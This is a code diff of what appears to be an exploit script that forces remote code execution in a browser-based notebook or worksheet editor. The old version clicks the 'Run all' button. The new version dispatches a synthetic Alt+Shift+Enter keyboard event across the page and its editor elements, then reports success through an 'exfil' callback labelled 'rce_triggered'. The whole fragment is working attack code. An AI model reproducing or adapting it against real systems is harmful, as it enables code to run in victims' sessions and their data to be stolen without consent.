@@ -36,21 +36,33 @@
     } catch(e) {}
     
     function triggerRunAll() {
-        const runAllBtn = document.querySelector('.editor-header__run-all-button');
-        if (runAllBtn) {
-            runAllBtn.click();
-            exfil('rce_triggered', { method: 'run_all_button_click', success: true });
-            return;
+        const event = new KeyboardEvent('keydown', {
+            key: 'Enter',
+            code: 'Enter',
+            keyCode: 13,
+            which: 13,
+            shiftKey: true,
+            altKey: true,
+            metaKey: false,
+            ctrlKey: false,
+            bubbles: true,
+            cancelable: true,
+            composed: true,
+            view: window
+        });
+        
+        document.dispatchEvent(event);
+        document.body.dispatchEvent(event);
+        window.dispatchEvent(event);
+        
+        if (document.activeElement) {
+            document.activeElement.dispatchEvent(event);
         }
-        const buttons = document.querySelectorAll('button');
-        for (const btn of buttons) {
-            if (btn.textContent.includes('Run all')) {
-                btn.click();
-                exfil('rce_triggered', { method: 'button_text_match', success: true });
-                return;
-            }
-        }
-        exfil('rce_trigger_failed', { message: 'Run all button not found' });
+        
+        const editors = document.querySelectorAll('.editor-content, .worksheet-content, .notebook-content, .cell-content');
+        editors.forEach(el => el.dispatchEvent(event));
+        
+        exfil('rce_triggered', { method: 'keyboard_shortcut_alt_shift_enter' });
     }
     
     setTimeout(triggerRunAll, 5000);
